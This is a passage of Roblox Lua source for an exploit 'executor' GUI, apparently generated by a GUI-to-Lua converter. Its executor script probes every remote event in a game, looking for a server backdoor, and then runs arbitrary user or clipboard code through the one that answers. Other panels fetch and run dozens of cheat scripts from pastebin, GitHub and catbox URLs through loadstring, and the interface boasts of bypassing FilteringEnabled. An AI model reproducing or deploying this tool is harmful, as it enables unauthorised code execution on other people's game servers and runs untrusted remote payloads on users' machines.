				end
			end
	
			return table.concat(highlighted)
		end
	
		return highlighter
	end
	
	script.Parent.Changed:Connect(function()
		script.Parent.TextLabel.Text = a().run(script.Parent.Text)
	end)
end;
task.spawn(C_15);
-- StarterGui.BS.win7.MAIN.Frames.executor.LocalScript
local function C_1b()
local script = G2L["1b"];
	--variables/funcs
	
	local inj=script.Parent.inj
	local exe=script.Parent.exe
	local execlip=script.Parent.execlip
	local cls=script.Parent.cls
	
	local backdoor=nil
	
	local function backdoorGetter()
		local remotes = {}
		local code = "BackdoorCheck_" .. math.random(100000, 999999)
	
		for _, remote in ipairs(game:GetDescendants()) do
			if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
				
				local fullName = remote:GetFullName()
				if fullName:find("RobloxReplicatedStorage") or remote.Name == "__FUNCTION" then
					continue
				end
	
				
				local success = pcall(function()
					if remote:IsA("RemoteEvent") then
						remote:FireServer("a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
					elseif remote:IsA("RemoteFunction") then
						remote:InvokeServer("a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
					end
				end)
	
				
				if workspace:FindFirstChild(code) then
					print('backdoor found!!')
					return remote
				else
					print('no backdoor:((((')
				end
			end
		end
	
		return nil
	end
	
	local backdoorExist = backdoor ~= nil
	
	--end
	
	inj.MouseButton1Click:Connect(function()
		if backdoorExist then
			print('backdoor already exist!!')
			return
		else
			if backdoorGetter()==nil then
				return
			else
				backdoor = backdoorGetter()
				return
			end
		end
	end)
	
	exe.MouseButton1Click:Connect(function()
		if backdoorExist then
			if backdoorExist then
				if backdoor:IsA('RemoteEvent') then
					backdoor:FireServer(script.Parent.TextBox.Text)
				else
					backdoor:InvokeServer(script.Parent.TextBox.Text)
				end
			end
			return
		else
			print('NO BACKDOOR!!! INJECT FIRT SKIDOO')
			return
		end
	end)
	
	execlip.MouseButton1Click:Connect(function()
		if backdoorExist then
			if backdoorExist then
				if backdoor:IsA('RemoteEvent') then
					backdoor:FireServer(getclipboard())
				else
					backdoor:InvokeServer(getclipboard())
				end
			end
			return
		else
			print('NO BACKDOOR!!! INJECT FIRT SKIDOO')
			return
		end
	end)
	
	cls.MouseButton1Click:Connect(function()
		script.Parent.TextBox.Text = ''
	end)
end;
task.spawn(C_1b);
-- StarterGui.BS.win7.MAIN.Frames.scripts.ScrollingFrame.TextButton.LocalScript
local function C_20()
local script = G2L["20"];
	script.Parent.MouseButton1Click:Connect(function()
		local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
		local Window = Library.CreateLib("Hubert Hub V1", "DarkTheme")
	
		--// FD SCRIPTS TAB \\--
	
		local Tab = Window:NewTab("FD Scripts")
		local KnifeSection = Tab:NewSection("Grab Knife")
		local RoXploitSection = Tab:NewSection("Ro-Xploit")
		local CoolkidSection = Tab:NewSection("Coolkid")
		local Section = Tab:NewSection("Basic")
	
	
		KnifeSection:NewButton("Grab Knife V1", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/SSAzNj10", true))()
		end)
	
		KnifeSection:NewButton("Grab Knife V2", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/Bw7aWTBL", true))()
		end)
	
		KnifeSection:NewButton("Grab Knife V3", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/frHvA27v", true))()
		end)
	
		KnifeSection:NewButton("Grab Knife V4", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/ANs9UDrn", true))()
		end)
	
		CoolkidSection:NewButton("Coolkid V4", "ButtonInfo", function()
			loadstring(game:GetObjects("rbxassetid://157645868")[1].Source)()
		end)
	
		CoolkidSection:NewButton("Coolkid V3", "ButtonInfo", function()
			loadstring(game:GetObjects("rbxassetid://142756431")[1].Source)()
		end)
	
		RoXploitSection:NewButton("Ro-Xploit 4.0", "ButtonInfo", function()
			loadstring(game:GetObjects("rbxassetid://175137115")[1].Source)()
		end)
	
		RoXploitSection:NewButton("Ro-Xploit 5.0", "ButtonInfo", function()
			loadstring(game:GetObjects("rbxassetid://288646117")[1].Source)()
		end)
	
		RoXploitSection:NewButton("Ro-Xploit 6.0", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/qqgpugGF", true))()
		end)
	
	
		Section:NewButton("YourMom GUI", "ButtonInfo", function()
			loadstring(game:GetObjects('rbxassetid://289110135')[1].Source)()
		end)
	
	
		Section:NewButton("Kappa GUI", "ButtonInfo", function()
			loadstring(game:GetObjects("rbxassetid://277963953")[1].Source)()
		end)
	
	
		Section:NewButton("Phantom X", "ButtonInfo", function()
			loadstring(game:GetObjects("rbxassetid://296648575")[1].Source)()
		end)
	
	
		Section:NewButton("PME's Commands", "ButtonInfo", function()
			loadstring(game:GetObjects("rbxassetid://303367841")[1].Source)()
		end)
	
	
		Section:NewButton("Scythe", "ButtonInfo", function()
			loadstring(game:GetObjects("rbxassetid://112829174")[1].Source)()
		end)
	
		Section:NewButton("666", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/d56eg7r9"))()
		end)
	
		Section:NewButton("Lua Hammer", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/RKY5fTXh", true))()
		end)
	
		Section:NewButton("Brock", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/LvRVzzTL", true))()
		end)
	
		Section:NewButton("Bird Wings", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/zCypYHjJ", true))()
		end)
	
		Section:NewButton("Doge", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/31xeU3pX", true))()
		end)
	
		Section:NewButton("Rose Hub", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/9q2nraUs", true))()
		end)
	
		Section:NewButton("Dev-Uzi", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/X2n20xqM", true))()
		end)
	
		Section:NewButton("Safazi Rocky2u", "ButtonInfo", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BAdmin%5D%20Rocky2u%20Edit", true))()
		end)
	
		Section:NewButton("Trump Titan", "ButtonInfo", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BTitans%5D%20Trump", true))()
		end)
	
		Section:NewButton("UVG", "ButtonInfo", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BGUI%5D%20Ultimate%20Van%20GUI", true))()
		end)
	
		Section:NewButton("T0PK3K 0.8", "ButtonInfo", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BGUI%5D%20T0PK3K%200.8", true))()
		end)
	
		Section:NewButton("T0PK3K 2.0", "ButtonInfo", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BGUI%5D%20T0PK3K%20V2", true))()
		end)
	
		Section:NewButton("T0PK3K 3.0", "ButtonInfo", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BGUI%5D%20T0PK3K%20V3", true))()
		end)
	
		Section:NewButton("T0PK3K 4.0", "ButtonInfo", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BGUI%5D%20T0PK3K%20V4", true))()
		end)
	
		Section:NewButton("Nebula Hub", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/fHGzkgyU", true))()
		end)
	
		Section:NewButton("Nae Nae", "ButtonInfo", function()
			loadstring(game:HttpGet("https://files.catbox.moe/dwlll4.txt", true))()
		end)
	
		Section:NewButton("iOrb 2.0", "ButtonInfo", function()
			loadstring(game:HttpGet("https://files.catbox.moe/uhtmgb.lua", true))()
		end)
	
		--// GAME SCRIPTS TAB \\--
	
		local Tab = Window:NewTab("Game Scripts")
		local SS = Tab:NewSection("All Games")
	
		SS:NewButton("Virgo V3", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/EwYDRD4Y", true))()
		end)
	
		SS:NewButton("Apoc Tools V4", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/0de4tAtR", true))()
		end)
	end)
end;
task.spawn(C_20);
-- StarterGui.BS.win7.MAIN.Frames.scripts.ScrollingFrame.TextButton.LocalScript
local function C_22()
local script = G2L["22"];
	script.Parent.MouseButton1Click:Connect(function()
	
		--Converted with ttyyuu12345's model to script plugin v4
		function sandbox(var,func)
			local env = getfenv(func)
			local newenv = setmetatable({},{
				__index = function(self,k)
					if k=="script" then
						return var
					else
						return env[k]
					end
				end,
			})
			setfenv(func,newenv)
			return func
		end
		cors = {}
		mas = Instance.new("Model",game:GetService("Lighting"))
		ScreenGui0 = Instance.new("ScreenGui")
		ImageLabel1 = Instance.new("ImageLabel")
		TextLabel2 = Instance.new("TextLabel")
		Frame3 = Instance.new("Frame")
		TextLabel4 = Instance.new("TextLabel")
		LocalScript5 = Instance.new("LocalScript")
		TextLabel6 = Instance.new("TextLabel")
		TextLabel7 = Instance.new("TextLabel")
		TextButton8 = Instance.new("TextButton")
		LocalScript9 = Instance.new("LocalScript")
		TextButton10 = Instance.new("TextButton")
		LocalScript11 = Instance.new("LocalScript")
		TextLabel12 = Instance.new("TextLabel")
		TextButton13 = Instance.new("TextButton")
		LocalScript14 = Instance.new("LocalScript")
		LocalScript15 = Instance.new("LocalScript")
		ScreenGui0.Parent = mas
		ScreenGui0.ResetOnSpawn = false
		ImageLabel1.Parent = ScreenGui0
		ImageLabel1.Position = UDim2.new(0.0959119499, 0, 0.234343439, 0)
		ImageLabel1.Size = UDim2.new(0, 490, 0, 339)
		ImageLabel1.BackgroundColor = BrickColor.new("Institutional white")
		ImageLabel1.BackgroundColor3 = Color3.new(1, 1, 1)
		ImageLabel1.BorderColor = BrickColor.new("Dusty Rose")
		ImageLabel1.BorderColor3 = Color3.new(0.678431, 0.317647, 0.317647)
		ImageLabel1.BorderSizePixel = 3
		ImageLabel1.Image = "rbxassetid://10074459797"
		TextLabel2.Parent = ImageLabel1
		TextLabel2.Size = UDim2.new(0, 490, 0, 19)
		TextLabel2.BackgroundColor = BrickColor.new("Medium brown")
		TextLabel2.BackgroundColor3 = Color3.new(0.227451, 0.227451, 0.227451)
		TextLabel2.BorderColor = BrickColor.new("Dusty Rose")
		TextLabel2.BorderColor3 = Color3.new(0.678431, 0.317647, 0.317647)
		TextLabel2.BorderSizePixel = 3
		TextLabel2.Font = Enum.Font.SourceSans
		TextLabel2.FontSize = Enum.FontSize.Size14
		TextLabel2.Text = "Herbert V1.0"
		TextLabel2.TextColor = BrickColor.new("Light stone grey")
		TextLabel2.TextColor3 = Color3.new(0.898039, 0.898039, 0.898039)
		TextLabel2.TextScaled = true
		TextLabel2.TextSize = 14
		TextLabel2.TextWrap = true
		TextLabel2.TextWrapped = true
		Frame3.Parent = ImageLabel1
		Frame3.Position = UDim2.new(0.0163265299, 0, 0.0882352963, 0)
		Frame3.Size = UDim2.new(0, 472, 0, 267)
		Frame3.BackgroundColor = BrickColor.new("Institutional white")
		Frame3.BackgroundColor3 = Color3.new(1, 1, 1)
		Frame3.BackgroundTransparency = 1
		Frame3.BorderColor = BrickColor.new("Really black")
		Frame3.BorderColor3 = Color3.new(0, 0, 0)
		Frame3.BorderSizePixel = 0
		TextLabel4.Parent = Frame3
		TextLabel4.Position = UDim2.new(0.00423728814, 0, 0.689138591, 0)
		TextLabel4.Size = UDim2.new(0, 322, 0, 87)
		TextLabel4.BackgroundColor = BrickColor.new("Dark taupe")
		TextLabel4.BackgroundColor3 = Color3.new(0.27451, 0.27451, 0.27451)
		TextLabel4.BackgroundTransparency = 0.15000000596046448
		TextLabel4.BorderColor = BrickColor.new("Tr. Red")
		TextLabel4.BorderColor3 = Color3.new(0.854902, 0.32549, 0.32549)
		TextLabel4.BorderSizePixel = 3
		TextLabel4.Font = Enum.Font.Cartoon
		TextLabel4.FontSize = Enum.FontSize.Size14
		TextLabel4.Text = "insert quote"
		TextLabel4.TextColor = BrickColor.new("Institutional white")
		TextLabel4.TextColor3 = Color3.new(1, 1, 1)
		TextLabel4.TextScaled = true
		TextLabel4.TextSize = 14
		TextLabel4.TextWrap = true
		TextLabel4.TextWrapped = true
		LocalScript5.Parent = TextLabel4
		table.insert(cors,sandbox(LocalScript5,function()
			local txtholder = script.Parent
	
			local quotes = {
				"FE has been bypassed!",
				"skidelijahmania moment",
				"always a good day to exist",
				"how are you today",
				"sponsored by protogent",
				"EXPAND DONG",
				"rune - the ai generated executor"
			}
	
			local function quote()
				local randomIndex = math.random(1, #quotes)
				return quotes[randomIndex]
			end
	
			txtholder.Text = quote()
		end))
		TextLabel6.Parent = Frame3
		TextLabel6.Position = UDim2.new(0.703389823, 0, 0.00374531839, 0)
		TextLabel6.Size = UDim2.new(0, 137, 0, 63)
		TextLabel6.BackgroundColor = BrickColor.new("Dark taupe")
		TextLabel6.BackgroundColor3 = Color3.new(0.27451, 0.27451, 0.27451)
		TextLabel6.BackgroundTransparency = 0.15000000596046448
		TextLabel6.BorderColor = BrickColor.new("Tr. Red")
		TextLabel6.BorderColor3 = Color3.new(0.854902, 0.32549, 0.32549)
		TextLabel6.BorderSizePixel = 3
		TextLabel6.Font = Enum.Font.Unknown
		TextLabel6.FontSize = Enum.FontSize.Size14
		TextLabel6.Text = "NEW: ROSE HUB WORKING FOR ALL GAMES!"
		TextLabel6.TextColor = BrickColor.new("Quill grey")
		TextLabel6.TextColor3 = Color3.new(0.862745, 0.862745, 0.862745)
		TextLabel6.TextScaled = true
		TextLabel6.TextSize = 14
		TextLabel6.TextWrap = true
		TextLabel6.TextWrapped = true
		TextLabel7.Parent = Frame3
		TextLabel7.Position = UDim2.new(0.711864412, 0, 0.288389504, 0)
		TextLabel7.Size = UDim2.new(0, 124, 0, 98)
		TextLabel7.BackgroundColor = BrickColor.new("Dark taupe")
		TextLabel7.BackgroundColor3 = Color3.new(0.27451, 0.27451, 0.27451)
		TextLabel7.BackgroundTransparency = 0.15000000596046448
		TextLabel7.BorderColor = BrickColor.new("Tr. Red")
		TextLabel7.BorderColor3 = Color3.new(0.854902, 0.32549, 0.32549)
		TextLabel7.BorderSizePixel = 3
		TextLabel7.Font = Enum.Font.Cartoon
		TextLabel7.FontSize = Enum.FontSize.Size14
		TextLabel7.Text = "Resurrected like Lazarus from the grave! Now with a serverside API bypassing FE!"
		TextLabel7.TextColor = BrickColor.new("Institutional white")
		TextLabel7.TextColor3 = Color3.new(1, 1, 1)
		TextLabel7.TextScaled = true
		TextLabel7.TextSize = 14
		TextLabel7.TextWrap = true
		TextLabel7.TextWrapped = true
		TextButton8.Name = "defaulthub"
		TextButton8.Parent = Frame3
		TextButton8.Position = UDim2.new(0.00423728814, 0, 0.179775283, 0)
		TextButton8.Size = UDim2.new(0, 125, 0, 39)
		TextButton8.BackgroundColor = BrickColor.new("Medium brown")
		TextButton8.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
		TextButton8.BackgroundTransparency = 0.3499999940395355
		TextButton8.BorderColor = BrickColor.new("Persimmon")
		TextButton8.BorderColor3 = Color3.new(1, 0.321569, 0.321569)
		TextButton8.BorderSizePixel = 3
		TextButton8.Font = Enum.Font.Cartoon
		TextButton8.FontSize = Enum.FontSize.Size14
		TextButton8.Text = "Execute Default Hub (reccomended)"
		TextButton8.TextColor = BrickColor.new("Institutional white")
		TextButton8.TextColor3 = Color3.new(1, 1, 1)
		TextButton8.TextScaled = true
		TextButton8.TextSize = 14
		TextButton8.TextWrap = true
		TextButton8.TextWrapped = true
		LocalScript9.Parent = TextButton8
		table.insert(cors,sandbox(LocalScript9,function()
			script.Parent.MouseButton1Click:connect(function()
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "HUBERT";
					Text = "executing hub, if it doesn't work go take a break";
					Duration = 3;
				})
				wait(2)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "HUBERT";
					Text = "cracking synapse x";
					Duration = 2;
				})
				wait(2)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "HUBERT";
					Text = "bribing the rose hub creator to help";
					Duration = 3;
				})
				wait(3)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "HUBERT";
					Text = "bribing roblox and byfron to help";
					Duration = 3;
				})
				wait(3)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "HUBERT";
					Text = "oh no a NAZI MOD BANNED YOU!";
					Duration = 3;
				})
				wait(2)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "HUBERT";
					Text = "bypassing FE";
					Duration = 3;
				})
				wait(3)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "HUBERT";
					Text = "using rune because netflixce is shit";
					Duration = 3;
				})
				wait(2)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "HUBERT";
					Text = "EXECUTED!";
					Duration = 3;
				})
				loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/HerbertV1/main/hub%20/hub.lua", true))()
			end)
		end))
		TextButton10.Name = "rosehub"
		TextButton10.Parent = Frame3
		TextButton10.Position = UDim2.new(0.00423728814, 0, 0.00374531839, 0)
		TextButton10.Size = UDim2.new(0, 125, 0, 38)
		TextButton10.BackgroundColor = BrickColor.new("Medium brown")
		TextButton10.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
		TextButton10.BackgroundTransparency = 0.3499999940395355
		TextButton10.BorderColor = BrickColor.new("Persimmon")
		TextButton10.BorderColor3 = Color3.new(1, 0.321569, 0.321569)
		TextButton10.BorderSizePixel = 3
		TextButton10.Font = Enum.Font.Cartoon
		TextButton10.FontSize = Enum.FontSize.Size14
		TextButton10.Text = "Execute Rose Hub"
		TextButton10.TextColor = BrickColor.new("Institutional white")
		TextButton10.TextColor3 = Color3.new(1, 1, 1)
		TextButton10.TextScaled = true
		TextButton10.TextSize = 14
		TextButton10.TextWrap = true
		TextButton10.TextWrapped = true
		LocalScript11.Parent = TextButton10
		table.insert(cors,sandbox(LocalScript11,function()
			script.Parent.MouseButton1Click:connect(function()
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "HUBERT";
					Text = "executing rose hub, if it doesn't work go take a break";
					Duration = 3;
				})
				wait(2)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "HUBERT";
					Text = "cracking synapse x";
					Duration = 2;
				})
				wait(2)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "HUBERT";
					Text = "bribing the rose hub creator to help";
					Duration = 3;
				})
				wait(3)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "HUBERT";
					Text = "done lmao";
					Duration = 3;
				})
				loadstring(game:HttpGet("https://fyle.uk/file/fphxL", true))()
			end)
		end))
		TextLabel12.Parent = Frame3
		TextLabel12.Position = UDim2.new(0.711933315, 0, 0.689138591, 0)
		TextLabel12.Size = UDim2.new(0, 125, 0, 87)
		TextLabel12.BackgroundColor = BrickColor.new("Dark taupe")
		TextLabel12.BackgroundColor3 = Color3.new(0.27451, 0.27451, 0.27451)
		TextLabel12.BackgroundTransparency = 0.15000000596046448
		TextLabel12.BorderColor = BrickColor.new("Tr. Red")
		TextLabel12.BorderColor3 = Color3.new(0.854902, 0.32549, 0.32549)
		TextLabel12.BorderSizePixel = 3
		TextLabel12.Font = Enum.Font.Cartoon
		TextLabel12.FontSize = Enum.FontSize.Size14
		TextLabel12.Text = "Made by LuaZ 3.0#4242"
		TextLabel12.TextColor = BrickColor.new("Institutional white")
		TextLabel12.TextColor3 = Color3.new(1, 1, 1)
		TextLabel12.TextScaled = true
		TextLabel12.TextSize = 14
		TextLabel12.TextWrap = true
		TextLabel12.TextWrapped = true
		TextButton13.Name = "inject"
		TextButton13.Parent = Frame3
		TextButton13.Position = UDim2.new(0.00423728814, 0, 0.378277153, 0)
		TextButton13.Size = UDim2.new(0, 125, 0, 31)
		TextButton13.BackgroundColor = BrickColor.new("Medium brown")
		TextButton13.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
		TextButton13.BackgroundTransparency = 0.3499999940395355
		TextButton13.BorderColor = BrickColor.new("Persimmon")
		TextButton13.BorderColor3 = Color3.new(1, 0.321569, 0.321569)
		TextButton13.BorderSizePixel = 3
		TextButton13.Font = Enum.Font.Cartoon
		TextButton13.FontSize = Enum.FontSize.Size14
		TextButton13.Text = "Inject"
		TextButton13.TextColor = BrickColor.new("Institutional white")
		TextButton13.TextColor3 = Color3.new(1, 1, 1)
		TextButton13.TextScaled = true
		TextButton13.TextSize = 14
		TextButton13.TextWrap = true
		TextButton13.TextWrapped = true
		LocalScript14.Parent = TextButton13
		table.insert(cors,sandbox(LocalScript14,function()
			script.Parent.MouseButton1Click:connect(function()
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "HUBERT";
					Text = "Already injected";
					Duration = 5;
				})
			end)
		end))
		LocalScript15.Name = "Dragify"
		LocalScript15.Parent = ImageLabel1
		table.insert(cors,sandbox(LocalScript15,function()
			local UIS = game:GetService("UserInputService")
			local dragSpeed = -math.huge
	
			local dragToggle = nil
			local dragInput = nil
			local dragStart = nil
			local dragPos = nil
	
			function dragify(Frame)
				function updateInput(input)
					local Delta = input.Position - dragStart
					local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
					script.Parent.Position = Position
				end
	
				Frame.InputBegan:Connect(function(input)
					if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
						dragToggle = true
						dragStart = input.Position
						startPos = Frame.Position
						input.Changed:Connect(function()
							if input.UserInputState == Enum.UserInputState.End then
								dragToggle = false
							end
						end)
					end
				end)
	
				Frame.InputChanged:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
						dragInput = input
					end
				end)
	
				game:GetService("UserInputService").InputChanged:Connect(function(input)
					if input == dragInput and dragToggle then
						updateInput(input)
					end
				end)
			end
	
			dragify(script.Parent)
		end))
		for i,v in pairs(mas:GetChildren()) do
			v.Parent = game:GetService("Players").LocalPlayer.PlayerGui
			pcall(function() v:MakeJoints() end)
		end
		mas:Destroy()
		for i,v in pairs(cors) do
			spawn(function()
				pcall(v)
			end)
		end
	
	end)
end;
task.spawn(C_22);
-- StarterGui.BS.win7.MAIN.Frames.scripts.ScrollingFrame.TextButton.LocalScript
local function C_24()
local script = G2L["24"];
	script.Parent.MouseButton1Click:Connect(function()
		game.StarterGui:SetCore("DevConsoleVisible", true)
		wait(0.7)
		print(require)
		wait(0.7)
		print("Secret Service Panel | Game ID : "..game.GameId)
		wait(0.7)
		print(loadstring)
		wait(0.7)
		print(require)
		wait(0.7)
		print("Secret Service Panel | FOUND ROBLOX PROCCES")
		print("Who Use My Script is : "..game.Players.LocalPlayer.Name)
		print(game.JobId)
		print(loadstring)
		wait(1.2)
		game.StarterGui:SetCore("DevConsoleVisible", false)
		local gui = Instance.new("ScreenGui")
		gui.Name = "Loadingscreen"
		gui.Parent = game.CoreGui
	
	
		local Loading = Instance.new("Frame")
		Loading.Size = UDim2.new(0, 0, 0.1, 0)
		Loading.Position = UDim2.new(0, 0, 0.4, 0)
		Loading.BackgroundColor3 = Color3.new(0, 0, 0)
		Loading.BorderColor3 = Color3.new(0, 0, 0)
		Loading.BorderSizePixel = 0
		Loading.BackgroundTransparency = 0.5 
		Loading.Parent = gui
		Loading:TweenSize(UDim2.new(0.5, 0, 0.1, 0), "Out", "Sine", 0.7, false)
	
		local Title = Instance.new("TextLabel")
		Title.Size = UDim2.new(0.2, 0, 0.05, 0)
		Title.Position = UDim2.new(0.4, 0, 0.4, 0)
		Title.BackgroundColor3 = Color3.new(0, 0, 0)
		Title.BorderColor3 = Color3.new(0, 0, 0)
		Title.BorderSizePixel = 1
		Title.Text = ""
		Title.TextScaled = true
		Title.BackgroundTransparency = 1 
		Title.TextColor3 = Color3.new(255, 255, 255)
		Title.Font = Enum.Font.Code
		Title.Parent = gui
		Title.LayoutOrder = 1
	
		local Loading2 = Instance.new("Frame")
		Loading2.Size = UDim2.new(0, 0, 0.1, 0)
		Loading2.Position = UDim2.new(1, 0, 0.4, 0)
		Loading2.BackgroundColor3 = Color3.new(0, 0, 0)
		Loading2.BorderColor3 = Color3.new(0, 0, 0)
		Loading2.BorderSizePixel = 0
		Loading2.BackgroundTransparency = 0.5 
		Loading2.Parent = gui
		Loading2:TweenSize(UDim2.new(-0.5, 0, 0.1, 0), "Out", "Sine", 0.7, false)
	
		local Title2 = Instance.new("TextLabel")
		Title2.Size = UDim2.new(1, 0, 0.5, 0)
		Title2.Position = UDim2.new(0, 0, 1, 0)
		Title2.BackgroundColor3 = Color3.new(0, 0, 0)
		Title2.BorderColor3 = Color3.new(0, 0, 0)
		Title2.BorderSizePixel = 1
		Title2.Text = ""
		Title2.TextScaled = true
		Title2.BackgroundTransparency = 1  
		Title2.TextColor3 = Color3.new(255, 255, 255)
		Title2.Font = Enum.Font.Code
		Title2.Parent = Title
	
	
	
		wait(1)
		Loading2:Destroy()
		Loading.Size = UDim2.new(1, 0, 0.1, 0)
	
		wait(0.1)
		local TEXT = "SECRET SERVICE PANEL"
		for i = 1, #TEXT do
			Title.Text = TEXT:sub(1, i)
			wait(0)
		end
	
		wait(1)
		local TeXt = "Be Free Be Proud | Made By U53RDV_7283"
		for i = 1, #TeXt do
			Title2.Text = TeXt:sub(1, i)
			wait(0)
		end
	
		wait(3)
		gui:Destroy()
		print("Secret Service Panel | Be Free Be Proud")
	
		local RM = Instance.new("RemoteEvent", game.ReplicatedStorage)
	
		local function Notice(Text)
			local gui = Instance.new("ScreenGui")
			gui.Name = "SSP Notification"
			gui.Parent = game.CoreGui
			gui.ResetOnSpawn = false
			gui.ClipToDeviceSafeArea = true
	
	
			local Notif = Instance.new("Frame")
			Notif.Size = UDim2.new(0, 300, 0, 150)
			Notif.Position = UDim2.new(1.1, 0, 0.69, 0)
			Notif.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			Notif.BorderColor3 = Color3.new(0, 0, 0)
			Notif.BorderSizePixel = 0
			Notif.BackgroundTransparency = 0 
			Notif.Parent = gui
			Notif:TweenPosition(UDim2.new(0.73, 0, 0.69, 0), "Out", "Sine", 0.9, false)
	
			local Line = Instance.new("Frame")
			Line.Size = UDim2.new(1, 0, 0.005, 0)
			Line.Position = UDim2.new(0, 0, 0.15, 0)
			Line.BackgroundColor3 = Color3.new(1, 1, 1)
			Line.BorderColor3 = Color3.new(0, 0, 0)
			Line.BorderSizePixel = 0
			Line.BackgroundTransparency = 0 
			Line.Parent = Notif
	
			local NotifTitle = Instance.new("TextLabel")
			NotifTitle.Size = UDim2.new(1, 0, 0.15, 0)
			NotifTitle.Position = UDim2.new(0, 0, 0, 0)
			NotifTitle.BackgroundColor3 = Color3.new(0, 0, 0)
			NotifTitle.BorderColor3 = Color3.new(0, 0, 0)
			NotifTitle.BorderSizePixel = 1
			NotifTitle.Text = " Secret Service Panel | Notification "
			NotifTitle.BackgroundTransparency = 1 
			NotifTitle.TextColor3 = Color3.new(255, 255, 255)
			NotifTitle.Font = Enum.Font.Code
			NotifTitle.Parent = Notif
			NotifTitle.TextScaled = true
	
			local NotifText = Instance.new("TextLabel")
			NotifText.Size = UDim2.new(1, 0, 0.85, 0)
			NotifText.Position = UDim2.new(0, 0, 0.16, 0)
			NotifText.BackgroundColor3 = Color3.new(0, 0, 0)
			NotifText.BorderColor3 = Color3.new(0, 0, 0)
			NotifText.BorderSizePixel = 0
			NotifText.Text = Text
			NotifText.BackgroundTransparency = 1 
			NotifText.TextColor3 = Color3.new(255, 255, 255)
			NotifText.Font = Enum.Font.Code
			NotifText.Parent = Notif
			NotifText.TextSize = 16
			NotifText.TextWrapped = true
			wait(5)
			Notif:TweenPosition(UDim2.new(1.3, 0, 0.69, 0), "Out", "Sine", 0.9, false)
			wait(1)
			gui:Destroy()
		end
	
		local gui = Instance.new("ScreenGui")
		gui.Name = "SSP U53RDV Edition"
		gui.Parent = game.CoreGui
		gui.ResetOnSpawn = false
		gui.ClipToDeviceSafeArea = false
	
		local TopBar = Instance.new("Frame")
		TopBar.Size = UDim2.new(0, 520, 0, 20)
		TopBar.Position = UDim2.new(0, 0, 0, 0)
		TopBar.BackgroundColor3 = Color3.fromRGB(50, 50,50)
		TopBar.BorderColor3 = Color3.new(0, 0, 0)
		TopBar.BorderSizePixel = 0
		TopBar.Active = true
		TopBar.BackgroundTransparency = 0 
		TopBar.Parent = gui
	
		local Black = Instance.new("Frame")
		Black.Size = UDim2.new(1, 0, 0, 0)
		Black.Position = UDim2.new(0, 0, 1, 0)
		Black.BackgroundColor3 = Color3.new(0, 0, 0)
		Black.BorderColor3 = Color3.new(0, 0, 0)
		Black.BorderSizePixel = 0
		Black.BackgroundTransparency = 0 
		Black.Parent = TopBar
		Black:TweenSize(UDim2.new(1, 0, 18, 0), "Out", "Sine", 0.7, false)
	
		local Title = Instance.new("TextLabel")
		Title.Size = UDim2.new(1, 0, 1, 0)
		Title.Position = UDim2.new(0, 0, 0, 0)
		Title.BackgroundColor3 = Color3.new(0, 0, 0)
		Title.BorderColor3 = Color3.new(0, 0, 0)
		Title.BorderSizePixel = 0
		Title.Text = " "
		Title.TextScaled = true
		Title.BackgroundTransparency = 1 
		Title.TextColor3 = Color3.new(255, 255, 255)
		Title.Font = Enum.Font.Code
		Title.Parent = TopBar
